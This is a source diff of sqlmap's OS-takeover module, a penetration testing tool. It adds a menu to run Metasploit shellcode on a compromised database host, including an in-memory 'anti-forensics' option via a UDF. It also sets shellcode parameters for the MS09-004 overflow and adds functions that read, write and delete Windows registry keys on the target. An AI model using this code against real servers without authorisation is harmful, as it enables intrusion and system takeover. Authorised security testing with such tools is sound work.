@@ -42,13 +42,12 @@ from lib.core.exception import sqlmapUnsupportedDBMSException
 from lib.core.shell import autoCompletion
 from lib.request.connect import Connect as Request
 from lib.takeover.abstraction import Abstraction
-from lib.takeover.dep import DEP
 from lib.takeover.metasploit import Metasploit
 from lib.takeover.registry import Registry
 from lib.techniques.outband.stacked import stackedTest
 
 
-class Takeover(Abstraction, DEP, Metasploit, Registry):
+class Takeover(Abstraction, Metasploit, Registry):
     """
     This class defines generic OS takeover functionalities for plugins.
     """
@@ -59,7 +58,6 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
         self.cmdFromChurrasco = False
 
         Abstraction.__init__(self)
-        DEP.__init__(self)
 
 
     def __webBackdoorRunCmd(self, backdoorUrl, cmd):
@@ -257,9 +255,6 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
             self.churrascoPath    = "%s/sqlmapchur%s.exe" % (conf.tmpPath, randomStr(lowercase=True))
             self.cmdFromChurrasco = True
 
-            # NOTE: no need to handle DEP for Churrasco executable because
-            # it spawns a new process as the SYSTEM user token to execute
-            # the executable passed as argument
             self.writeFile(wFile, self.churrascoPath, "binary", confirm=False)
 
             return True
@@ -309,28 +304,53 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
 
         self.initEnv()
         self.getRemoteTempPath()
-        self.createMsfPayloadStager()
-        self.uploadMsfPayloadStager()
 
-        if kb.os == "Windows":
-            # NOTE: no need to add an exception to DEP for the payload
-            # stager because it already sets the memory to +rwx before
-            # copying the shellcode into that memory page
-            #self.handleDep(self.exeFilePathRemote)
+        goUdf     = False
+        condition = ( kb.dbms == "MySQL" or kb.dbms == "PostgreSQL" )
 
-            if conf.privEsc and kb.dbms == "MySQL":
+        if condition is True:
+            msg  = "how do you want to execute the Metasploit shellcode "
+            msg += "on the back-end database underlying operating system?"
+            msg += "\n[1] Stand-alone payload stager (file system way, default)"
+            msg += "\n[2] Via UDF 'sys_bineval' (in-memory way, anti-forensics)"
+
+            while True:
+                choice = readInput(msg, default=1)
+
+                if isinstance(choice, str) and choice.isdigit() and int(choice) in ( 1, 2 ):
+                    choice = int(choice)
+                    break
+
+                elif isinstance(choice, int) and choice in ( 1, 2 ):
+                    break
+
+                else:
+                    warnMsg = "invalid value, valid values are 1 and 2"
+                    logger.warn(warnMsg)
+
+            if choice == 2:
+                goUdf = True
+
+        if goUdf is True:
+            self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
+        else:
+            self.createMsfPayloadStager()
+            self.uploadMsfPayloadStager()
+
+        if kb.os == "Windows" and conf.privEsc:
+            if kb.dbms == "MySQL":
                 debugMsg  = "by default MySQL on Windows runs as SYSTEM "
                 debugMsg += "user, no need to privilege escalate"
                 logger.debug(debugMsg)
 
-            elif conf.privEsc and kb.dbms == "PostgreSQL":
+            elif kb.dbms == "PostgreSQL":
                 warnMsg  = "by default PostgreSQL on Windows runs as postgres "
                 warnMsg += "user which has no Windows Impersonation "
                 warnMsg += "Tokens: it is unlikely that the privilege "
                 warnMsg += "escalation will be successful"
                 logger.warn(warnMsg)
 
-            elif conf.privEsc and kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
+            elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                 warnMsg  = "often Microsoft SQL Server %s " % kb.dbmsVersion[0]
                 warnMsg += "runs as Network Service which has no Windows "
                 warnMsg += "Impersonation Tokens within all threads, this "
@@ -350,7 +370,7 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
             # system is not Windows
             conf.privEsc = False
 
-        self.pwn()
+        self.pwn(goUdf)
 
 
     def osSmb(self):
@@ -424,11 +444,134 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
         infoMsg += "buffer overflow (MS09-004)"
         logger.info(infoMsg)
 
-        # NOTE: only needed to handle DEP
         self.initEnv(mandatory=False, detailed=True)
-
         self.getRemoteTempPath()
-        self.createMsfShellcode()
-        self.overflowBypassDEP()
+        self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
         self.bof()
-        self.delException()
+
+
+    def __regInit(self):
+        stackedTest()
+
+        if kb.stackedTest == False:
+            return
+
+        self.checkDbmsOs()
+
+        if kb.os != "Windows":
+            errMsg  = "the back-end DBMS underlying operating system is "
+            errMsg += "not Windows"
+            raise sqlmapUnsupportedDBMSException, errMsg
+
+        self.initEnv()
+        self.getRemoteTempPath()
+
+
+    def regRead(self):
+        self.__regInit()
+
+        if not conf.regKey:
+            default = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+            msg     = "which registry key do you want to read? [%s] " % default
+            regKey  = readInput(msg, default=default)
+        else:
+            regKey = conf.regKey
+
+        if not conf.regVal:
+            default = "ProductName"
+            msg     = "which registry key value do you want to read? [%s] " % default
+            regVal  = readInput(msg, default=default)
+        else:
+            regVal = conf.regVal
+
+        infoMsg = "reading Windows registry path '%s\%s' " % (regKey, regVal)
+        logger.info(infoMsg)
+
+        return self.readRegKey(regKey, regVal, False)
+
+
+    def regAdd(self):
+        self.__regInit()
+
+        errMsg = "missing mandatory option"
+
+        if not conf.regKey:
+            msg    = "which registry key do you want to write? "
+            regKey = readInput(msg)
+
+            if not regKey:
+                raise sqlmapMissingMandatoryOptionException, errMsg
+        else:
+            regKey = conf.regKey
+
+        if not conf.regVal:
+            msg    = "which registry key value do you want to write? "
+            regVal = readInput(msg)
+
+            if not regVal:
+                raise sqlmapMissingMandatoryOptionException, errMsg
+        else:
+            regVal = conf.regVal
+
+        if not conf.regData:
+            msg     = "which registry key value data do you want to write? "
+            regData = readInput(msg)
+
+            if not regData:
+                raise sqlmapMissingMandatoryOptionException, errMsg
+        else:
+            regData = conf.regData
+
+        if not conf.regType:
+            default = "REG_SZ"
+            msg     = "which registry key value data-type is it? "
+            msg    += "[%s] " % default
+            regType = readInput(msg, default=default)
+        else:
+            regType = conf.regType
+
+        infoMsg  = "adding Windows registry path '%s\%s' " % (regKey, regVal)
+        infoMsg += "with data '%s'. " % regData
+        infoMsg += "This will work only if the user running the database "
+        infoMsg += "process has privileges to modify the Windows registry."
+        logger.info(infoMsg)
+
+        self.addRegKey(regKey, regVal, regType, regData)
+
+
+    def regDel(self):
+        self.__regInit()
+
+        errMsg = "missing mandatory option"
+
+        if not conf.regKey:
+            msg    = "which registry key do you want to delete? "
+            regKey = readInput(msg)
+
+            if not regKey:
+                raise sqlmapMissingMandatoryOptionException, errMsg
+        else:
+            regKey = conf.regKey
+
+        if not conf.regVal:
+            msg    = "which registry key value do you want to delete? "
+            regVal = readInput(msg, default=default)
+
+            if not regVal:
+                raise sqlmapMissingMandatoryOptionException, errMsg
+        else:
+            regVal = conf.regVal
+
+        message  = "are you sure that you want to delete the Windows "
+        message += "registry path '%s\%s? [y/N] " % (regKey, regVal)
+        output   = readInput(message, default="N")
+
+        if output and output[0] not in ( "Y", "y" ):
+            return
+
+        infoMsg  = "deleting Windows registry path '%s\%s'" % (regKey, regVal)
+        infoMsg += "This will work only if the user running the database "
+        infoMsg += "process has privileges to modify the Windows registry."
+        logger.info(infoMsg)
+
+        self.delRegKey(regKey, regVal)
